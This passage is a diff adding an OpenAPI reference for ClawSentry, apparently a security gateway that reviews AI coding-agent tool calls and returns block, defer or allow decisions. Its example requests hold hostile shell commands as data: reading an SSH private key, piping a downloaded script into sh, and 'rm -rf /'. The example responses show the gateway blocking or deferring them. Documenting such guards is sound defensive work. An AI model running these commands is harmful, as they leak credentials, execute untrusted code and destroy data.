@@ -1,0 +1,2365 @@
+{
+  "openapi": "3.1.0",
+  "info": {
+    "title": "ClawSentry Public API Reference",
+    "version": "0.5.3",
+    "description": "Docs-owned OpenAPI artifact generated from route inventory plus curated semantic metadata. It does not change runtime API behavior."
+  },
+  "servers": [
+    {
+      "url": "http://127.0.0.1:8080",
+      "description": "ClawSentry Gateway"
+    },
+    {
+      "url": "http://127.0.0.1:8081",
+      "description": "OpenClaw Webhook Receiver (example)"
+    }
+  ],
+  "components": {
+    "securitySchemes": {
+      "BearerAuth": {
+        "type": "http",
+        "scheme": "bearer"
+      },
+      "WebhookSignature": {
+        "type": "apiKey",
+        "in": "header",
+        "name": "X-AHP-Signature"
+      },
+      "WebhookTimestamp": {
+        "type": "apiKey",
+        "in": "header",
+        "name": "X-AHP-Timestamp"
+      }
+    },
+    "schemas": {
+      "CanonicalDecision": {
+        "type": "object",
+        "required": [
+          "decision",
+          "reason",
+          "risk_level"
+        ],
+        "properties": {
+          "decision": {
+            "type": "string",
+            "enum": [
+              "allow",
+              "block",
+              "defer",
+              "modify"
+            ]
+          },
+          "reason": {
+            "type": "string"
+          },
+          "risk_level": {
+            "type": "string",
+            "enum": [
+              "low",
+              "medium",
+              "high",
+              "critical"
+            ]
+          },
+          "final": {
+            "type": "boolean"
+          }
+        }
+      },
+      "CanonicalEvent": {
+        "type": "object",
+        "required": [
+          "schema_version",
+          "event_id",
+          "event_type",
+          "session_id",
+          "source_framework",
+          "payload"
+        ],
+        "properties": {
+          "schema_version": {
+            "type": "string"
+          },
+          "event_id": {
+            "type": "string"
+          },
+          "event_type": {
+            "type": "string"
+          },
+          "session_id": {
+            "type": "string"
+          },
+          "source_framework": {
+            "type": "string"
+          },
+          "payload": {
+            "type": "object"
+          }
+        }
+      },
+      "ErrorResponse": {
+        "type": "object",
+        "properties": {
+          "error": {
+            "type": "string"
+          },
+          "failure_class": {
+            "type": "string"
+          }
+        }
+      }
+    }
+  },
+  "paths": {
+    "/ahp": {
+      "post": {
+        "tags": [
+          "AHP 决策"
+        ],
+        "summary": "OpenClaw/AHP JSON-RPC 同步决策入口",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token. See `api/decisions.md#post-ahp`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "jsonrpc": "2.0",
+                  "id": "req-001",
+                  "result": {
+                    "decision": "block",
+                    "risk_level": "critical",
+                    "reason": "credential file access requires operator review",
+                    "final": true
+                  }
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2413",
+        "x-clawsentry-markdown-ref": "api/decisions.md#post-ahp",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "jsonrpc": "2.0",
+                "method": "sync_decision",
+                "id": "req-001",
+                "params": {
+                  "event": {
+                    "schema_version": "ahp.1.0",
+                    "event_id": "evt-001",
+                    "event_type": "pre_action",
+                    "session_id": "sess-001",
+                    "source_framework": "openclaw",
+                    "tool_name": "bash",
+                    "payload": {
+                      "command": "cat ~/.ssh/id_rsa"
+                    }
+                  }
+                }
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/ahp/a3s": {
+      "post": {
+        "tags": [
+          "AHP 决策"
+        ],
+        "summary": "a3s-code HTTP Transport 入口",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token. See `api/decisions.md#post-ahp-a3s`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "decision": "defer",
+                  "risk_level": "high",
+                  "reason": "download-and-execute flow requires approval",
+                  "approval_id": "apr-001",
+                  "final": false
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2441",
+        "x-clawsentry-markdown-ref": "api/decisions.md#post-ahp-a3s",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "request_id": "a3s-001",
+                "event": {
+                  "schema_version": "ahp.1.0",
+                  "event_type": "pre_action",
+                  "session_id": "sess-a3s",
+                  "source_framework": "a3s-code",
+                  "payload": {
+                    "tool": "bash",
+                    "command": "curl https://example.com/script.sh | sh"
+                  }
+                }
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/ahp/codex": {
+      "post": {
+        "tags": [
+          "AHP 决策"
+        ],
+        "summary": "Codex native hook / HTTP transport 入口",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token. See `api/decisions.md#post-ahp-codex`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "permissionDecision": "deny",
+                  "permissionDecisionReason": "destructive command blocked by ClawSentry"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2475",
+        "x-clawsentry-markdown-ref": "api/decisions.md#post-ahp-codex",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "hook_event_name": "PreToolUse",
+                "tool_name": "Bash",
+                "session_id": "sess-codex",
+                "tool_input": {
+                  "command": "rm -rf /"
+                }
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/ahp/resolve": {
+      "post": {
+        "tags": [
+          "AHP 决策"
+        ],
+        "summary": "DEFER/审批结果回写入口",
+        "description": "Service: `stack`. Auth: `bearer-disabled-when-empty-token`. Uses Gateway auth dependency; CS_AUTH_TOKEN empty disables Bearer auth. See `api/decisions.md#post-ahp-resolve`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "resolved",
+                  "decision": "allow",
+                  "approval_id": "apr-001"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/stack.py:203",
+        "x-clawsentry-markdown-ref": "api/decisions.md#post-ahp-resolve",
+        "x-clawsentry-auth-note": "Uses Gateway auth dependency; CS_AUTH_TOKEN empty disables Bearer auth.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "approval_id": "apr-001",
+                "request_id": "req-001",
+                "decision": "allow",
+                "reason": "Operator verified the command target is a disposable sandbox."
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/health": {
+      "get": {
+        "tags": [
+          "运行状态"
+        ],
+        "summary": "Gateway 健康检查",
+        "description": "Service: `gateway`. Auth: `none`. Gateway health endpoint is intentionally unauthenticated. See `api/reporting.md#get-health`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "healthy",
+                  "component": "gateway"
+                }
+              }
+            }
+          },
+          "500": {
+            "description": "Error 500"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2514",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-health",
+        "x-clawsentry-auth-note": "Gateway health endpoint is intentionally unauthenticated."
+      }
+    },
+    "/metrics": {
+      "get": {
+        "tags": [
+          "运行状态"
+        ],
+        "summary": "Prometheus 指标",
+        "description": "Service: `gateway`. Auth: `metrics-conditional`. CS_METRICS_AUTH=true requires Bearer token; false/empty exposes metrics without auth. See `api/reporting.md#get-metrics`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "text/plain": {
+                "example": "# HELP clawsentry_decisions_total Total decisions\nclawsentry_decisions_total{decision=\"block\"} 3\n"
+              }
+            }
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "500": {
+            "description": "Error 500"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2528",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-metrics",
+        "x-clawsentry-auth-note": "CS_METRICS_AUTH=true requires Bearer token; false/empty exposes metrics without auth."
+      }
+    },
+    "/report/summary": {
+      "get": {
+        "tags": [
+          "报表与监控"
+        ],
+        "summary": "聚合统计",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-summary`.",
+        "parameters": [
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "total_decisions": 128,
+                  "risk_distribution": {
+                    "low": 101,
+                    "medium": 18,
+                    "high": 8,
+                    "critical": 1
+                  },
+                  "active_sessions": 7,
+                  "l3_advisory": {
+                    "snapshots": 4,
+                    "jobs": {
+                      "queued": 1,
+                      "completed": 3
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2540",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-summary",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/stream": {
+      "get": {
+        "tags": [
+          "报表与监控"
+        ],
+        "summary": "SSE 实时事件流",
+        "description": "Service: `gateway`. Auth: `query-token`. Accepts Bearer token and browser-friendly ?token= query auth; CS_AUTH_TOKEN empty disables auth. See `api/reporting.md#get-report-stream`.",
+        "parameters": [
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          },
+          {
+            "name": "session_id",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "min_risk",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "string",
+              "enum": [
+                "low",
+                "medium",
+                "high",
+                "critical"
+              ]
+            }
+          },
+          {
+            "name": "types",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "token",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "text/event-stream": {
+                "example": "event: decision\ndata: {\"session_id\":\"sess-001\",\"decision\":\"block\",\"risk_level\":\"high\"}\n\n"
+              }
+            }
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "429": {
+            "description": "Error 429"
+          },
+          "500": {
+            "description": "Error 500"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2580",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-stream",
+        "x-clawsentry-auth-note": "Accepts Bearer token and browser-friendly ?token= query auth; CS_AUTH_TOKEN empty disables auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/sessions": {
+      "get": {
+        "tags": [
+          "报表与监控"
+        ],
+        "summary": "会话列表",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-sessions`.",
+        "parameters": [
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "sessions": [
+                    {
+                      "session_id": "sess-001",
+                      "workspace": "/workspace/demo",
+                      "max_risk": "high",
+                      "latest_decision": "defer",
+                      "event_count": 12
+                    }
+                  ],
+                  "total": 1
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2694",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-sessions",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/session/{session_id}/risk": {
+      "get": {
+        "tags": [
+          "报表与监控"
+        ],
+        "summary": "会话风险时间线",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-session-risk`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "session_id": "sess-001",
+                  "risk_timeline": [
+                    {
+                      "timestamp": "2026-04-22T08:00:00Z",
+                      "risk_level": "high",
+                      "reason": "credential access"
+                    }
+                  ]
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2787",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-session-risk",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/session/{session_id}": {
+      "get": {
+        "tags": [
+          "报表与监控"
+        ],
+        "summary": "会话事件回放",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-session`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "session_id": "sess-001",
+                  "records": [
+                    {
+                      "event": {
+                        "event_type": "pre_action",
+                        "tool_name": "bash"
+                      },
+                      "decision": {
+                        "decision": "block",
+                        "risk_level": "high"
+                      }
+                    }
+                  ]
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3132",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-session",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/session/{session_id}/page": {
+      "get": {
+        "tags": [
+          "报表与监控"
+        ],
+        "summary": "分页会话事件回放",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-session-page`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "session_id": "sess-001",
+                  "records": [],
+                  "next_cursor": null,
+                  "has_more": false
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3180",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-session-page",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/alerts": {
+      "get": {
+        "tags": [
+          "告警与处置"
+        ],
+        "summary": "告警列表",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-alerts`.",
+        "parameters": [
+          {
+            "name": "window_seconds",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 604800
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "alerts": [
+                    {
+                      "alert_id": "alert-001",
+                      "severity": "high",
+                      "status": "open",
+                      "session_id": "sess-001"
+                    }
+                  ]
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3244",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-alerts",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/alerts/{alert_id}/acknowledge": {
+      "post": {
+        "tags": [
+          "告警与处置"
+        ],
+        "summary": "确认告警",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#post-report-alerts-acknowledge`.",
+        "parameters": [
+          {
+            "name": "alert_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "alert_id": "alert-001",
+                  "status": "acknowledged"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3327",
+        "x-clawsentry-markdown-ref": "api/reporting.md#post-report-alerts-acknowledge",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "operator": "secops@example.com",
+                "note": "Reviewed and assigned."
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/session/{session_id}/enforcement": {
+      "get": {
+        "tags": [
+          "告警与处置"
+        ],
+        "summary": "查询会话强制状态",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-report-session-enforcement`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "session_id": "sess-001",
+                  "enforced": false,
+                  "reason": null
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3351",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-report-session-enforcement",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      },
+      "post": {
+        "tags": [
+          "告警与处置"
+        ],
+        "summary": "释放会话强制状态",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#post-report-session-enforcement`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "session_id": "sess-001",
+                  "enforced": false,
+                  "reason": null
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3358",
+        "x-clawsentry-markdown-ref": "api/reporting.md#post-report-session-enforcement",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "action": "release",
+                "reason": "Operator cleared the session hold."
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/ahp/patterns": {
+      "get": {
+        "tags": [
+          "规则与模式"
+        ],
+        "summary": "查看自进化模式",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#get-ahp-patterns`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "patterns": [
+                    {
+                      "id": "credential-upload",
+                      "status": "active"
+                    }
+                  ]
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3397",
+        "x-clawsentry-markdown-ref": "api/reporting.md#get-ahp-patterns",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/ahp/patterns/confirm": {
+      "post": {
+        "tags": [
+          "规则与模式"
+        ],
+        "summary": "确认候选模式",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#post-ahp-patterns-confirm`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "pattern_id": "candidate-001",
+                  "status": "confirmed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3411",
+        "x-clawsentry-markdown-ref": "api/reporting.md#post-ahp-patterns-confirm",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "pattern_id": "candidate-001",
+                "decision": "confirm"
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/webhook/openclaw": {
+      "post": {
+        "tags": [
+          "Webhook"
+        ],
+        "summary": "OpenClaw Webhook 事件接收",
+        "description": "Service: `openclaw-webhook`. Auth: `webhook-token|webhook-hmac-optional`. Bearer/OpenClaw token required. HMAC is config-dependent: skipped when no secret is configured; strict mode rejects missing/invalid signatures when secret exists. Timestamp, content-type, optional IP allowlist, and idempotencyKey are validated. See `api/webhooks.md#post-webhook-openclaw`.",
+        "parameters": [
+          {
+            "name": "Authorization",
+            "in": "header",
+            "required": true,
+            "schema": {
+              "type": "string"
+            },
+            "description": "Bearer <OPENCLAW_WEBHOOK_TOKEN>"
+          },
+          {
+            "name": "X-AHP-Signature",
+            "in": "header",
+            "required": false,
+            "schema": {
+              "type": "string"
+            },
+            "description": "v1=<hmac-sha256>, required in strict mode when OPENCLAW_WEBHOOK_SECRET is configured"
+          },
+          {
+            "name": "X-AHP-Timestamp",
+            "in": "header",
+            "required": false,
+            "schema": {
+              "type": "string"
+            },
+            "description": "Unix timestamp used for signed webhook replay protection"
+          },
+          {
+            "name": "Content-Type",
+            "in": "header",
+            "required": true,
+            "schema": {
+              "type": "string",
+              "enum": [
+                "application/json"
+              ]
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "decision": "block",
+                  "reason": "destructive command pattern detected",
+                  "risk_level": "high",
+                  "failure_class": "none",
+                  "final": true
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "403": {
+            "description": "Error 403"
+          },
+          "409": {
+            "description": "Error 409"
+          },
+          "413": {
+            "description": "Error 413"
+          },
+          "415": {
+            "description": "Error 415"
+          },
+          "422": {
+            "description": "Error 422"
+          },
+          "500": {
+            "description": "Error 500"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/adapters/openclaw_webhook_receiver.py:45",
+        "x-clawsentry-markdown-ref": "api/webhooks.md#post-webhook-openclaw",
+        "x-clawsentry-auth-note": "Bearer/OpenClaw token required. HMAC is config-dependent: skipped when no secret is configured; strict mode rejects missing/invalid signatures when secret exists. Timestamp, content-type, optional IP allowlist, and idempotencyKey are validated.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "type": "exec.approval.requested",
+                "idempotencyKey": "openclaw-demo-001",
+                "sessionKey": "sess-001",
+                "agentId": "agent-001",
+                "payload": {
+                  "command": "rm -rf /tmp/demo",
+                  "approval_id": "apr-001"
+                }
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/session/{session_id}/l3-advisory/snapshots": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "创建 L3 evidence snapshot",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2810",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      },
+      "get": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "列出 L3 evidence snapshots",
